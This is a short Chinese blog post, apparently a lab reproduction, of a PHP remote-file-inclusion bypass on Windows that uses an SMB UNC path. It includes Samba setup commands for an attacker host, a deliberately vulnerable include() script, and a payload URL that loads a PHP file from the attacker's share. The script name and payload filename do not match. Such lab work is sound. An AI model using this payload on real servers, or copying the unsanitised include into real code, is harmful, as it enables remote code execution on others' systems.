## RFI 绕过 URL 包含限制 getshell ##
时间：2019/5/27

### 前言 ###
在放学的时候，瞄到这篇文章。咦，由这种操作
火速的复现了一波
文章地址：[RFI 绕过 URL 包含限制 getshell](https://paper.seebug.org/923/)

### 实验过程 ###
环境如下：
```
phpstudy
samba
```

首先要在文件包含漏洞里面实现远程包含要满足两个条件
```
allow_url_fopen=On	
allow_url_include=On
```

默认的php.ini是这样的：
```
allow_url_fopen=On	
allow_url_include=Off
```

完全不可能实现远程包含的可能，而smb的出现打破了久未的局面
首先根据文章把allow_url_fopen和allow_url_include设置为Off
```
allow_url_fopen=Off	
allow_url_include=Off
```
![](https://s2.ax1x.com/2019/05/27/VZrruD.png)

在kali上执行以下命令：
```
apt-get install samba
mkdir /var/www/html/pub

#配置smb
chmod 0555 /var/www/html/pub/
chown -R nobody:nogroup /var/www/html/pub/
echo > /etc/samba/smb.conf
#将下面的内容放在/etc/samba/smb.conf文件中
[global]
workgroup = WORKGROUP
server string = Samba Server %v
netbios name = indishell-lab
security = user
map to guest = bad user
name resolve order = bcast host
dns proxy = no
bind interfaces only = yes

[ethan]
path = /var/www/html/pub
writable = no
guest ok = yes
guest only = yes
read only = yes
directory mode = 0555
force user = nobody

#启动smb
service smbd start
```
在windows里面连接smb
![](https://s2.ax1x.com/2019/05/27/VZrzKU.md.png)

rfi.php
```php
<?php
if(isset($_GET['a'])){
	$a=$_GET['a'];
	include($a);
}
?>
```

执行如下payload
```
http://192.168.1.113/demo.php?a=\\192.168.1.115\ethan\phpinfo.php
```

![](https://s2.ax1x.com/2019/05/27/VZsxJI.png)


<b>对了，Linux下测试smb绕过发现并不行</b>